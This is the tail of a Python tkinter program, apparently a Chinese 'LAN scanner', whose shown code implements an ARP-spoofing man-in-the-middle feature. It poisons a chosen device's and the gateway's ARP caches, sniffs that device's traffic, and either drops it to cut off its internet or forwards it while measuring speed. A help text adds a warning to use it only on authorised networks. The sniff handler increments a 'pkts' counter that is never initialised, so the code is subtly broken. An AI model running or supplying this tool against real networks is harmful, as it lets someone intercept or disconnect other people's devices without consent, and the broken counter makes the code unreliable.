            messagebox.showwarning("提示", "不能对本机或网关执行管控。")
            return
        if not self.ensure_scapy():
            return
        if not self.gateway:
            messagebox.showwarning("无网关", "未检测到默认网关，无法进行管控。")
            return
        if not self.gateway_mac:
            self.gateway_mac = self.get_mac(self.gateway)
        tmac = self.get_mac(ip)
        if not self.gateway_mac or not tmac:
            messagebox.showerror("解析失败", f"无法解析 {ip} 或网关的 MAC 地址，请先扫描到该设备。")
            return
        state = {"ip": ip, "tmac": tmac, "block": block,
                 "stop": threading.Event(), "up": 0, "down": 0,
                 "last": time.time(), "threads": []}
        self.mitm[ip] = state
        t1 = threading.Thread(target=self._spoof_loop, args=(state,), daemon=True)
        t2 = threading.Thread(target=self._sniff_loop, args=(state,), daemon=True)
        t1.start()
        t2.start()
        state["threads"] = [t1, t2]
        self.update_treeview()
        self.status_var.set(f"{'禁止上网' if block else '观测网速'} 已对 {ip} 启动（中间人模式）")
        self._start_speed_timer()

    def _spoof_loop(self, state):
        scapy = self.scapy
        ip, tmac = state["ip"], state["tmac"]
        gip, gmac, amac = self.gateway, self.gateway_mac, self.local_mac
        while not state["stop"].is_set():
            # 骗目标：网关的 MAC = 本机
            scapy.sendp(scapy.Ether(dst=tmac) /
                        scapy.ARP(op=2, pdst=ip, psrc=gip, hwdst=tmac, hwsrc=amac),
                        verbose=0, iface=self.iface)
            # 骗网关：目标的 MAC = 本机
            scapy.sendp(scapy.Ether(dst=gmac) /
                        scapy.ARP(op=2, pdst=gip, psrc=ip, hwdst=gmac, hwsrc=amac),
                        verbose=0, iface=self.iface)
            time.sleep(0.5)

    def _sniff_loop(self, state):
        scapy = self.scapy
        ip, tmac = state["ip"], state["tmac"]
        gmac, amac = self.gateway_mac, self.local_mac

        def handle(pkt):
            # 跳过自己转发出去的包，避免抓回来再转发造成回环风暴
            if pkt.haslayer(scapy.Ether) and pkt[scapy.Ether].src == amac:
                return
            if not pkt.haslayer(scapy.IP):
                return
            iph = pkt[scapy.IP]
            state["pkts"] += 1
            if iph.src == ip:           # 目标 → 外网（上行）
                state["up"] += len(pkt)
                if not state["block"] and pkt.haslayer(scapy.Ether):
                    scapy.sendp(scapy.Ether(src=amac, dst=gmac) / iph,
                                verbose=0, iface=self.iface)
            elif iph.dst == ip:         # 外网 → 目标（下行）
                state["down"] += len(pkt)
                if not state["block"] and pkt.haslayer(scapy.Ether):
                    scapy.sendp(scapy.Ether(src=amac, dst=tmac) / iph,
                                verbose=0, iface=self.iface)

        while not state["stop"].is_set():
            try:
                scapy.sniff(filter=f"host {ip}", prn=handle, store=0,
                            iface=self.iface, timeout=1, promisc=True)
            except Exception as e:
                print("sniff error:", e)
                time.sleep(1)

    def _restore_arp(self, state):
        if not self.scapy:
            return
        scapy = self.scapy
        ip, tmac = state["ip"], state["tmac"]
        gip, gmac = self.gateway, self.gateway_mac
        for _ in range(3):
            # 告诉目标：网关真实 MAC
            scapy.sendp(scapy.Ether(dst=tmac) /
                        scapy.ARP(op=2, pdst=ip, psrc=gip, hwdst=tmac, hwsrc=gmac),
                        verbose=0, iface=self.iface)
            # 告诉网关：目标真实 MAC
            scapy.sendp(scapy.Ether(dst=gmac) /
                        scapy.ARP(op=2, pdst=gip, psrc=ip, hwdst=gmac, hwsrc=tmac),
                        verbose=0, iface=self.iface)
            time.sleep(0.1)

    def stop_mitm(self, ip):
        st = self.mitm.get(ip)
        if not st:
            return
        st["stop"].set()
        time.sleep(0.2)
        self._restore_arp(st)
        self.mitm.pop(ip, None)
        self.update_treeview()

    def stop_all_mitm(self):
        for ip in list(self.mitm.keys()):
            self.stop_mitm(ip)
        self.status_var.set("已全部停止管控，并还原 ARP 表")

    def _fmt_speed(self, up, down):
        return f"↑{up/1024:.0f} ↓{down/1024:.0f} KB/s"

    def _start_speed_timer(self):
        if self._speed_timer:
            return

        def tick():
            for ip, st in self.mitm.items():
                now = time.time()
                dt = max(now - st["last"], 0.001)
                up_k = st["up"] / 1024 / dt
                down_k = st["down"] / 1024 / dt
                st["up"] = 0
                st["down"] = 0
                st["last"] = now
                item = self.tree_items.get(ip)
                if item:
                    self.tree.set(item, "speed", f"↑{up_k:.0f} ↓{down_k:.0f} KB/s")
            if self.mitm:
                self._speed_timer = self.root.after(1000, tick)
            else:
                self._speed_timer = None

        self._speed_timer = self.root.after(1000, tick)

    def on_tree_click(self, event):
        region = self.tree.identify("region", event.x, event.y)
        if region != "cell":
            return
        col = self.tree.identify_column(event.x)
        cols = list(self.tree["columns"])
        if col != f"#{cols.index('ctrl') + 1}":
            return
        item = self.tree.identify_row(event.y)
        if item:
            ip = self._strip_ip(self.tree.set(item, "ip"))
            self.toggle_block(ip)

    def toggle_block(self, ip):
        if ip in self.mitm:
            self.stop_mitm(ip)
            self.status_var.set(f"已恢复 {ip} 上网")
        else:
            self.start_mitm(ip, block=True)

    def toggle_monitor(self, ip):
        if ip in self.mitm:
            self.stop_mitm(ip)
            self.status_var.set(f"已停止对 {ip} 的观测")
        else:
            self.start_mitm(ip, block=False)

    def toggle_block_selected(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("提示", "请先选中一台设备。")
            return
        self.toggle_block(self._strip_ip(self.tree.set(sel[0], "ip")))

    def toggle_monitor_selected(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("提示", "请先选中一台设备。")
            return
        self.toggle_monitor(self._strip_ip(self.tree.set(sel[0], "ip")))

    def on_close(self):
        try:
            self.stop_all_mitm()
        except Exception:
            pass
        try:
            if self._speed_timer:
                self.root.after_cancel(self._speed_timer)
        except Exception:
            pass
        self.root.destroy()

    # ---------- 帮助 ----------
    def show_help(self):
        help_text = """
        📖 使用说明 (v1.4)：
        1. 输入子网前缀（如 192.168.0），点击"开始扫描"
        2. 并发 Ping 探测活跃主机，读取 ARP 表获取 MAC 地址
        3. "厂商"列根据 MAC 前 3 字节(OUI)自动识别设备厂商
        4. 勾选"解析设备名"→反向 DNS获取主机名（无PTR记录则留空）
        5. 勾选"扫描端口"→探测30个常用端口，如 80(HTTP),443(HTTPS)
        6. "最近在线"显示该设备本次被发现的时间
        7. 状态栏显示【本机连接: WiFi / 有线(以太网)】及网关地址
        8. 绿色=在线，灰色=离线/历史；双击或右键可编辑/删除
        9. 支持搜索过滤、保存加载、导出 JSON/CSV

        🛡 局域网管控（新功能）：
        · "管控"列显示每台设备的状态：○允许 / ■已禁网 / ●测速中
        · 直接点击该列单元格 = 一键「禁止上网 / 恢复」
        · 右键菜单也可执行「禁止上网 / 恢复」和「观测网速 / 停止」
        · "流量"列实时显示该设备的上行/下行 KB/s（仅观测中显示）
        · 顶部「⛔ 停止全部管控」可一键还原所有被控设备
        · 关闭程序会自动停止欺骗并还原 ARP 表

        ⚠ 重要前提与警告：
        · 必须以【管理员身份】运行；需安装 scapy (pip install scapy)
          和 Npcap（https://npcap.com，安装时勾选 WinPcap 兼容）
        · 普通电脑不是路由器，本功能采用 ARP 中间人方式实现：
          开启后目标的上网流量会经过本机。请【仅在你自己拥有/授权的
          局域网络】内测试使用，并事先取得相关方同意。
        · 关闭开关或退出程序会立即还原，不会影响网络。

        💡 提示：OUI 数据为精简版(~90条常见厂商)，未收录的显示为空。
        端口扫描/反向DNS需一定时间；Linux/macOS读取ARP通常需要root权限。
        设备级WiFi/有线无法由ARP判定，本工具仅能识别本机上网方式。
        """
        messagebox.showinfo("帮助", help_text)

    # ---------- 入口 ----------
    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    app = LANScannerApp()
    app.run()
